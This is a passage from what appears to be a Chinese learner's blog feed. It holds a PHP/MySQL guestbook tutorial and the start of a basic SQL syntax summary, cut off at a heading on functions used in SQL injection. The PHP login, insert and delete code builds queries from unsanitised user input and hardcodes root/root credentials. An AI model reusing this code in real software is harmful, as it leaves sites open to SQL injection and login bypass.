&lt;/div&gt;    </span><br><span class="line">         <span class="meta">&lt;?php</span> </span><br><span class="line">     &#125;</span><br><span class="line">         <span class="meta">?&gt;</span>       </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>2.save.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">此处是完成留言板的增加留言的功能</span></span><br><span class="line"><span class="comment">无论你是否是管理员都可以发表留言</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span> (<span class="string">'connect.php'</span>);</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">'test3.php'</span>);</span><br><span class="line">  $n = <span class="keyword">new</span> input();</span><br><span class="line">  $flag = $n-&gt;post(<span class="string">'content'</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>($flag === <span class="keyword">false</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"输入内容不能为空！！"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   $content = $flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  $flag = $n-&gt;post(<span class="string">'user'</span>);</span><br><span class="line">  <span class="keyword">if</span>( $flag == <span class="keyword">false</span> )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"输入名字违规！！"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   $user = $flag;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// var_dump($n-&gt;post($user)); </span></span><br><span class="line">  $time = time();   <span class="comment">//time函数是用来表示时间戳，从1970年开始，也就是1970之前不能表示</span></span><br><span class="line">  $sql = <span class="string">"insert into msg(content,user,intime) values('&#123;$content&#125;','&#123;$user&#125;','&#123;$time&#125;')"</span>;  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  这里用花括号是因为你在单引号里面不知道这个$后面跟着的是变量还是字符串</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//echo $sql;</span></span><br><span class="line"></span><br><span class="line">   $db-&gt;query(<span class="string">"SET NAMES UTF8"</span>); </span><br><span class="line">    <span class="comment">//确保数据传输也是UTF-8，防止出现乱码，可能会出现这种情况，但我发现我删除之后没影响，最好还是些写写吧，小心是UTF8，没有横线</span></span><br><span class="line"></span><br><span class="line">  $flag =  $db-&gt;query($sql);</span><br><span class="line">  <span class="keyword">if</span>($flag == <span class="keyword">true</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  header(<span class="string">"location:book.php"</span>);<span class="comment">//重定向</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'操作失败！'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//header("location:book.php");    </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>3.connect.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">此处是数据库连接的关键文件</span></span><br><span class="line"><span class="comment">每次执行sql都需要连接数据库</span></span><br><span class="line"><span class="comment">单独写进一个文件在用文件包含比较方便</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">  $host = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">  $dbuser = <span class="string">'root'</span>;</span><br><span class="line">  $pwd = <span class="string">'root'</span>;</span><br><span class="line">  $dbname = <span class="string">'php10'</span>;</span><br><span class="line"></span><br><span class="line">  $db = <span class="keyword">new</span> mysqli($host,$dbuser,$pwd,$dbname);</span><br><span class="line">  $db-&gt;query(<span class="string">'SET NAMES UTF8'</span>);</span><br><span class="line">  <span class="keyword">if</span>($db-&gt;connect_errno !=<span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'连接失败！'</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>4.test3.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">此处是用于输入的判断，这里的试isset函数帮我解决了那个Undefined index:的错误</span></span><br><span class="line"><span class="comment">这里也让我明白了这个PHP函数可以随意返回东西，不想C++那样只能返回对应函数类型的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">input</span></span>&#123;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[$key]) === <span class="keyword">false</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">//禁止使用的用户名,代码恶意过滤</span></span><br><span class="line">  $n = [<span class="string">'张三'</span>,<span class="string">'李四'</span>,<span class="string">'王五'</span>];</span><br><span class="line">      <span class="keyword">foreach</span>( $n <span class="keyword">as</span> $name)</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">if</span>($key == $name)</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      $val = $_POST[$key];</span><br><span class="line">      <span class="keyword">return</span> $val;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[$key]) === <span class="keyword">false</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//禁止使用的用户名,代码恶意过滤</span></span><br><span class="line">  $val = $_GET[$key];</span><br><span class="line">      <span class="keyword">return</span> $val;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>5.mysql.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">此处是留言板颜面查询功能的实现</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">'connect.php'</span>);</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from msg order by id DESC"</span>;</span><br><span class="line"><span class="comment">//执行SQL语句</span></span><br><span class="line">$mysqli_result = $db-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($mysqli_result === <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'操作失败！'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">fetch_array首次调用显示最新的一条记录</span></span><br><span class="line"><span class="comment">重复调用，依次显示后面的记录</span></span><br><span class="line"><span class="comment">如果没记录可显示，就返回NULL</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $c['id'];</span></span><br><span class="line"><span class="comment">// echo $c['content'];</span></span><br><span class="line"><span class="comment">// echo $c['user'];</span></span><br><span class="line"><span class="comment">// echo $c['intime'];  //测试部分。。这里的$符号忘记了写，找了很久才找得到，原谅新手O(∩_∩)O</span></span><br><span class="line"></span><br><span class="line">$d = [];</span><br><span class="line"><span class="keyword">while</span>($c = $mysqli_result-&gt;fetch_array(MYSQLI_ASSOC))  <span class="comment">//这里的$c变量运用了类型转换</span></span><br><span class="line">&#123;</span><br><span class="line">$d[] = $c;  </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这里的[]可以天可以不填，不填的话，就会自动索引从0开始，并且是个二维数组，一维对应的字段键值，如果自己想定义可以这样$d[$c['id']] = $c;这是以id为键值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>6.login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">登录功能的实现</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    session_start();  <span class="comment">//session的用法其实就是相当与一个数组,可跨网页使用</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">'test3.php'</span>);</span><br><span class="line">$input = <span class="keyword">new</span> input();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> (<span class="string">'connect.php'</span>);</span><br><span class="line">$act = $input-&gt;get(<span class="string">'act'</span>);</span><br><span class="line"><span class="comment">//var_dump($act);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($act !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$username = $input-&gt;post(<span class="string">'username'</span>);</span><br><span class="line">$password = $input-&gt;post(<span class="string">'password'</span>);</span><br><span class="line"><span class="comment">//var_dump($username,$password);</span></span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">把下面这一段代码放在外面的话，一直会爆未定义变量的错误，找了很久才发现因该在里面写</span></span><br><span class="line"><span class="comment">请原谅新手。。。。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">$sql = <span class="string">"select * from ada where username='&#123;$username&#125;' and password='&#123;$password&#125;'"</span>;</span><br><span class="line"></span><br><span class="line"> $mysqli_result = $db-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($row = $mysqli_result-&gt;fetch_array(MYSQLI_ASSOC))</span><br><span class="line"> &#123;</span><br><span class="line"> $_SESSION[<span class="string">'username'</span>] = $row[<span class="string">'username'</span>];</span><br><span class="line"> header(<span class="string">"Location:book.php"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">echo</span><span class="string">"登陆失败！"</span>;</span><br><span class="line"> <span class="keyword">exit</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>/&gt;</span><br><span class="line">&lt;title&gt;管理员登陆&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action = <span class="string">'login.php?act=chk'</span> method=<span class="string">"post"</span>&gt;    &lt;!--get方法的变量只需要在这个action里面定义即可--&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">'username'</span>/&gt;</span><br><span class="line">&lt;input type=<span class="string">'password'</span> name= <span class="string">'password'</span> /&gt;    &lt;!--type改成password可以隐藏明文--&gt;</span><br><span class="line">&lt;input type=<span class="string">'submit'</span> value=<span class="string">'点击登录'</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>7.delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除功能的实现</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) ==<span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"需要管理员权限！！"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> (<span class="string">'test3.php'</span>);</span><br><span class="line">$input = <span class="keyword">new</span> input();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">$id = $input-&gt;get(<span class="string">'id'</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'connect.php'</span>);</span><br><span class="line">$sql = <span class="string">"delete from msg where id='&#123;$id&#125;'"</span>;</span><br><span class="line">$is = $db-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($is == <span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">"Location:book.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"删除失败！！"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>对数据库学习的大致总结</title>
      <link href="/2018/02/04/sql-Summary/"/>
      <url>/2018/02/04/sql-Summary/</url>
      <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01  前言"></a>0x01  前言</h2><p>  花了两天时间，了解了一下数据库的基本语法以及操作，看的是SQL必知必会这本书，感觉这本书比较薄，看起来不像课本那样详细，所以我总结的也不太全面，请多多包含吧。。。。。</p><a id="more"></a><h2 id="0x02-正文"><a href="#0x02-正文" class="headerlink" title="0x02 正文"></a>0x02 正文</h2><h3 id="1-Navicat的使用"><a href="#1-Navicat的使用" class="headerlink" title="1 Navicat的使用"></a>1 Navicat的使用</h3><p> 如果你没接触过SQL，可以先用这款软件去熟悉一下数据库的结构，这款软件只要连接好数据库就能用了十分方便，还能在里面练习SQL语句。。。</p><h3 id="2-数据库的结构"><a href="#2-数据库的结构" class="headerlink" title="2 数据库的结构"></a>2 数据库的结构</h3><p>个人看了几天书，我认为数据库一般都是按照下面的顺序去操作的：数据库-&gt;表-&gt;字段(列)-&gt;行</p><h3 id="3-数据库的各种语句以及操作"><a href="#3-数据库的各种语句以及操作" class="headerlink" title="3 数据库的各种语句以及操作"></a>3 数据库的各种语句以及操作</h3><h4 id="3-1-注释"><a href="#3-1-注释" class="headerlink" title="3.1 注释"></a>3.1 注释</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.#   </span><br><span class="line">2.--       </span><br><span class="line">3./*   */       </span><br><span class="line">（前两个都是单行注释，注意双斜杠后面有空格，第三个是多行注释）</span><br></pre></td></tr></table></figure><h4 id="3-2-创建数据库"><a href="#3-2-创建数据库" class="headerlink" title="3.2 创建数据库"></a>3.2 创建数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> 数据库名称;</span><br></pre></td></tr></table></figure><h4 id="3-3-查看数据库"><a href="#3-3-查看数据库" class="headerlink" title="3.3 查看数据库"></a>3.3 查看数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure><h4 id="3-4-切换数据库"><a href="#3-4-切换数据库" class="headerlink" title="3.4 切换数据库"></a>3.4 切换数据库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">USE</span> 数据库名;</span><br></pre></td></tr></table></figure><p>####3.5 删除数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> 数据库名;</span><br></pre></td></tr></table></figure><p><code>注意</code> SQL语句对大小写不敏感，并且以分号作为语句的结束</p><h4 id="3-6-创建数据表"><a href="#3-6-创建数据表" class="headerlink" title="3.6 创建数据表"></a>3.6 创建数据表</h4><p>如：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> teacher(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">4</span>) <span class="keyword">not</span> <span class="literal">null</span> primary <span class="keyword">key</span> auto_increment,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">sex <span class="built_in">char</span>(<span class="number">10</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">addr <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>####3.7 查看数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span>;</span><br></pre></td></tr></table></figure><h4 id="3-8-插入数据表"><a href="#3-8-插入数据表" class="headerlink" title="3.8 插入数据表"></a>3.8 插入数据表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">INTO</span> teacher(<span class="keyword">name</span>,sex,addr)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">'Leo'</span>,<span class="string">'Male'</span>,<span class="string">'hangzhou'</span>);</span><br></pre></td></tr></table></figure><h4 id="3-9-查询数据表"><a href="#3-9-查询数据表" class="headerlink" title="3.9 查询数据表"></a>3.9 查询数据表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> teacher;</span><br></pre></td></tr></table></figure><p>要搜索多个列用逗号隔开，例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">user</span> <span class="keyword">from</span> teacher;   <span class="comment">/*没有明确排定的顺序，每一次查询的顺序可能都不一样，很正常，牵扯到DBMS的回收机制，看看书就好，不多说*/</span></span><br></pre></td></tr></table></figure><h4 id="3-10-where句子"><a href="#3-10-where句子" class="headerlink" title="3.10 where句子"></a>3.10 where句子</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 你要的信息 <span class="keyword">from</span> 数据表(或多个) <span class="keyword">where</span> 满足的条件(判断的条件)</span><br></pre></td></tr></table></figure><p>“*”代表所有符合数据，where也可以用于update或者delete语句中</p><h4 id="3-11-order-by句子"><a href="#3-11-order-by句子" class="headerlink" title="3.11 order by句子"></a>3.11 order by句子</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 你要的信息 <span class="keyword">from</span> 数据表(或多个) <span class="keyword">order</span> <span class="keyword">by</span> 字段 <span class="keyword">ASC</span>/<span class="keyword">DESC</span>   <span class="comment">/*按字母等顺序排序，后面的ASC那些可以不写，默认ASC升序，DESC降序*/</span></span><br></pre></td></tr></table></figure><p>可使用order by ‘数字’，判断数据标的字段长度</p><p>使用该子句时，应确保他是select语句的最后一个字句，即当where子句出现的时候order by应该放在where的后面，不然会报错</p><p>按多个列排序，像搜索的时候用逗号隔开即可，如：<code>select user，content from msg order by user,content;</code>这句话只有在user这个条件都一样的时候才会对content排序，如果user都是唯一的话，没啥实际作用。。。。</p><h4 id="3-12-union句子"><a href="#3-12-union句子" class="headerlink" title="3.12 union句子"></a>3.12 union句子</h4><p>可以合并两个表中的信息</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 你要的信息 <span class="keyword">from</span> 数据表<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> 你要的信息 <span class="keyword">from</span> 数据表<span class="number">2</span>;  <span class="comment">/*对于这句话，它是不显示两个表中的相同的信息的*/</span></span><br></pre></td></tr></table></figure><p>要显示全部信息的话可以使用union all,对于那一种，其实还有个distinct关键字让数据库只返回不同的值，不多说，可以自己去看书学习</p><h4 id="3-13-limit句子"><a href="#3-13-limit句子" class="headerlink" title="3.13 limit句子"></a>3.13 limit句子</h4><p>limit指定返回的行数，例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> teacher <span class="keyword">limit</span> <span class="number">5</span> <span class="keyword">offset</span> <span class="number">5</span>;  //这里的offset是从第几行开始，这句话是从第五行起的五行数据</span><br></pre></td></tr></table></figure><p><code>注意：</code>第0行的问题<br><code>limit 1 offset 1</code> 是从数据表的的第二行开始，因为数据库第一行相当于语句的第0行</p><h4 id="3-14-更新数据"><a href="#3-14-更新数据" class="headerlink" title="3.14 更新数据"></a>3.14 更新数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> teacher <span class="keyword">set</span> <span class="keyword">name</span> = <span class="string">'0ver'</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure><h4 id="3-15-删除表的内容"><a href="#3-15-删除表的内容" class="headerlink" title="3.15 删除表的内容"></a>3.15 删除表的内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">table</span></span><br></pre></td></tr></table></figure><h4 id="3-16-删除表"><a href="#3-16-删除表" class="headerlink" title="3.16 删除表"></a>3.16 删除表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> 表名</span><br></pre></td></tr></table></figure><h4 id="3-17-sql注入中常用的内置函数"><a href="#3-17-sql注入中常用的内置函数" 